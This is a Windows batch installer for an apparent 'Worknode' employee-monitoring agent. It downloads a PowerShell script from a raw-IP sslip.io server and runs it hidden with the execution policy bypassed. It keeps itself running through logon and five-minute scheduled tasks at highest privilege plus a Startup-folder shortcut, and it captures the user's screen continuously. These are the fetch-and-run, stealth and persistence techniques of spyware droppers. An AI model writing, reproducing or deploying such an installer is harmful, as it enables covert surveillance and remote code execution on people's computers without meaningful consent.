@echo off
:: Worknode System-Wide Desktop Telemetry Agent Engine v2.4 1-Click Installer
title Worknode System Agent v2.4 Setup

echo =======================================================
echo   Worknode System-Wide Background Agent Engine (v2.4)
echo =======================================================
echo.

set "TARGET_DIR=%LOCALAPPDATA%\WorknodeAgent"
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

set "SERVER_URL=https://51-38-71-134.sslip.io"
set "AGENT_PS1=%TARGET_DIR%\StaffOps-Agent.ps1"
set "VBS_LAUNCHER=%TARGET_DIR%\run-agent-silent.vbs"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

if "%USER_ID%"=="" set /p USER_ID="Enter Employee Email or ID for this Workstation (e.g. ahmad@gmail.com): "
if "%USER_ID%"=="" set "USER_ID=ahmad@gmail.com"

echo Workstation User Account: %USER_ID%
echo Target Engine Path: %AGENT_PS1%
echo.

echo [1/4] Downloading Latest Worknode Agent Engine (v2.4) from Server...
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; (New-Object System.Net.WebClient).DownloadFile('%SERVER_URL%/desktop-agent/StaffOps-Agent.ps1', '%AGENT_PS1%')"

echo [2/4] Creating Silent Background Execution Wrapper...
echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_LAUNCHER%"
echo WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -Command ""Set-ExecutionPolicy Bypass -Scope Process -Force; & '%AGENT_PS1%' -ServerUrl '%SERVER_URL%' -UserId '%USER_ID%'""", 0, false >> "%VBS_LAUNCHER%"

echo [3/4] Registering Windows System Task Scheduler & Watchdog Service...
schtasks /create /tn "WorknodeSystemSyncEngine" /tr "wscript.exe \"%VBS_LAUNCHER%\"" /sc ONLOGON /rl HIGHEST /f >nul 2>&1
schtasks /create /tn "WorknodeSystemSyncWatchdog" /tr "wscript.exe \"%VBS_LAUNCHER%\"" /sc MINUTE /mo 5 /rl HIGHEST /f >nul 2>&1

echo [4/4] Creating Windows Startup Folder Shortcut Fallback...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$wsh = New-Object -ComObject WScript.Shell; $sc = $wsh.CreateShortcut('%STARTUP_DIR%\WorknodeWorkstationSync.lnk'); $sc.TargetPath = 'wscript.exe'; $sc.Arguments = '\"%VBS_LAUNCHER%\"'; $sc.WorkingDirectory = '%TARGET_DIR%'; $sc.WindowStyle = 7; $sc.Save()"

echo.
echo Launching Worknode Background Agent Engine...
wscript.exe "%VBS_LAUNCHER%"

echo.
echo =========================================================================
echo SUCCESS! Worknode System Agent (v2.4) is now active for %USER_ID%.
echo It is running as a Windows System Service & Watchdog.
echo It captures desktop screen & idle telemetry continuously across all
echo applications, browsers, and windows -- even when browsers are closed!
echo =========================================================================
echo.
pause
